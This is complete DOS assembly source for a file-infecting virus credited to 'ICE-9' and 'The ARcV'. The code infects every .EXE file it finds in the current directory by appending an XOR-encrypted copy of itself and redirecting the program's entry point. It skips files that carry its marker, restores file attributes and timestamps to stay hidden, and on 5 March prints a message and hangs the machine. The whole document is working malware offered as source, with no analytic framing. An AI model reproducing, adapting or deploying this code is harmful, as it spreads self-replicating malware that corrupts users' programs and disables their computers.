 
                        NAME NO2
                        PAGE 55,132
                        TITLE ??????


len                     equ offset key_1+4-0100h
en_len                  equ offset encry_and_save-offset main3

code segment

                        org 100h

                        ASSUME CS:CODE,DS:CODE,ES:CODE




main:                   jmp setup
main2:                  push cs
                        pop ds

                        mov ds:[data_seg],es    ; save data segments
                        mov ds:[stck_seg],ss    ; save stack segment
                        mov ds:[stck_p],sp      ; save stack pointer
                        mov ax,cs
                        add ax,10h              ; set up new stack segment
                        xor bx,bx
                        dec bx                  ; set up new stack pointer
                        mov sp,bx
                        mov ss,ax

                        call encry1             ; unencrypt rest of the virus

                        mov ax,ds:[code_seg]    ; calculate return segment
                        mov bx,es               ; save the return address
                        add bx,10h
                        add ax,bx
                        mov word ptr ds:[ret1+1],ax
                        mov ax,ds:[code_ip]
                        mov word ptr ds:[ret2+1],ax

main3:                  mov ah,2ah
                        int 21h
                        cmp dx,0305h            ; check for activation date
                        jne label_1             ; 5 March

                        mov ah,9h               ; if 5 March print message
                        mov dx,offset msg
                        int 21h
crash:                  jmp crash               ; and crash


label_1:                push cs
                        pop es
                        mov ah,1ah              ; setup new dta
                        mov dx,offset dta
                        int 21h

                        mov ah,4eh
                        mov cx,3
                        mov dx,offset filetype  ; find file *.EXE
                        int 21h
                        jnc open_file
lexit:                  jmp exit                ; if no files exit

next_file:              call close_file
                        mov ah,4fh
                        call file_int21
                        jc lexit


open_file:              mov al,byte ptr ds:[dta+15h]
                        xor ah,ah               ; save attribs
                        mov ds:[file_att],ax

                        xor cx,cx
                        call set_att            ; clear attribs

                        mov ax,3d02h 
                        mov dx,offset dta+1eh   ; open file
                        int 21h
                        jc lexit
                        mov ds:[handle],ax      ; save handle

                        mov ah,3fh
                        mov dx,offset header    ; read in header
                        mov cx,18h
                        call file_int21

                        xor cx,cx               ; move file pointer to
                        dec cx                  ; -4 from end of file
                        mov dx,-4
                        call file_int21_fp 
                        add ax,4
                        push ax                 ; push low word of length

                        mov ah,3fh
                        mov cx,4                ; read in 4 bytes
                        mov dx,offset temp1     ; which may be the marker
                        call file_int21

                        pop ax                  ; pop low word of length
                        mov di,offset temp1
                        mov si,offset key_1 
                        mov cx,4
                        repe cmpsb              ; check to see if it is our 
                        jcxz next_file          ; marker

adjust_len:
                        and ax,0fh              ; pad out file so our code
                        mov dx,10h              ; can always start at offset
                        sub dx,ax               ; 0100h
                        mov cx,0
                        call file_int21_fp

                        mov word ptr ds:[file_size],ax          ; save file len
                        mov word ptr ds:[file_size+2],dx

                        call encry_and_save     ; write our code to end of file

                        mov ax,word ptr ds:[file_size]          ; get file len
                        mov dx,word ptr ds:[file_size+2]
                        push ax                 ; store file len
                        push dx

                        mov bx,word ptr ds:[header+08h]         ; get length of 
                                                                ; header
                        mov cx,10h                              
                        div cx                                  ; sub it off
                        sub ax,bx                               ; length of file

                        mov bx,word ptr ds:[header+16h]         ; store old 
                        mov ds:[code_seg],bx                    ; start address
                        mov bx,word ptr ds:[header+14h]
                        mov ds:[code_ip],bx

                        sub ax,10h                              ; store new
                        mov word ptr ds:[header+16h],ax         ; start address
                        mov word ptr ds:[header+14h],0103h

                        pop dx                  ; get back file length
                        pop ax

                        add ax,len              ; add our length to it.
                        adc dx,0

                        push ax
                        mov cl,9                ; this bit calcs
                        shr ax,cl               ; length DIV 512
                        ror dx,cl               ; and MOD 512
                        stc

                        adc dx,ax
                        pop ax
                        and ah,1

                        mov word ptr ds:[header+02h],ax         ; write this 
                        mov word ptr ds:[header+04h],dx         ; to the header

                        mov ax,4200h            ; move file pointer to
                        xor cx,cx               ; start of file
                        cwd       
                        call file_int21

                        mov ah,40h              ; write header
                        mov cx,18h
                        mov dx,offset header
                        call file_int21

                        mov cx,word ptr ds:[dta+16h]            ; restore file 
                        mov dx,word ptr ds:[dta+18h]            ; time/date
                        mov ax,5701h
                        call file_int21

                        call close_file                         ; close file

exit:                   mov ax,ds:[stck_seg]                                
                        mov bx,ds:[stck_p]                             
                        mov ss,ax                               ; restore ss:sp
                        mov sp,bx
                        mov ax,ds:[data_seg]
                        mov ds,ax
                        mov es,ax

ret1:                   mov ax,0000h            ; get return address (cs:ip)
ret2:                   mov bx,0000h
                        push ax                 ; push them
                        push bx
                        xor ax,ax               ; clear all regs.
                        mov bx,ax
                        mov cx,ax
                        mov dx,ax
                        mov si,ax
                        mov di,ax
                        retf                    ; return to old code

close_file:             mov ah,3eh              ; close file.
                        call file_int21
                        mov cx,ds:[file_att]    ; restore old attribs
                        call set_att            


set_att:                mov ax,4301h
                        mov dx,offset dta+1eh
                        jmp file_int21

; tell 'em who wrote it. this is never displayed.

                        db '[X-1]',00h 
                        db 'ICE-9',00h  
                                                                   
; bellow is the message that the virus displays.

msg                     db '   ICE-9 Presents',0dh,0ah              
                        db ' In Association with',0dh,0ah
                        db '      The  ARcV',0dh,0ah
                        db '        [X-1]',0dh,0ah
                        db 0ah,07h,0dh
                        db 'Michelangelo activates',0dh,0ah
                        db '   -< TOMORROW >-',0dh,0ah
                        db '$' 

filetype                db '*.EXE',00h
code_seg                dw 0h
code_ip                 dw 0h

encry_and_save:         mov ah,2ch                      ; get new key
                        int 21h
                        or dx,dx
                        jz encry_and_save
                        mov byte ptr ds:[key_1-1],dh
                        call encry1                     ; encrypt virus
                        mov ah,40h
                        mov cx,len
                        mov dx,offset main              ; save virus
                        call file_int21
                        jmp encry1                      ; unencrypt

file_int21_fp:          mov ax,4202h
file_int21:             mov bx,ds:[handle]
                        int 21h
                        ret
 

encry1:                 mov si,offset main3 
                        mov cx,en_len
un1:                    xor byte ptr ds:[si],01h        ; very simple XOR 
key_1:                  inc si                          ; encryption
                        loop un1
                        ret
  
; end of the virus


setup:                  mov ax,20cdh
                        mov ds:[0100h],ax       ; this is just used to
                        mov ds:[code_seg],-10h  ; set up values for
                        mov ds:[code_ip],0100h  ; first time the virus is exec'ed
                        call encry1             ; it is NOT part of the virus.
                        jmp main2

handle                  dw 0h                   ; lots of data 
header                  db 20h dup (?)
data_seg                dw 0h
stck_seg                dw 0h
stck_p                  dw 0h
file_size               dd 0h
temp1                   db 5 dup (?)
dta                     db 6fh dup (?)
file_att                dw 0h

code ends

end main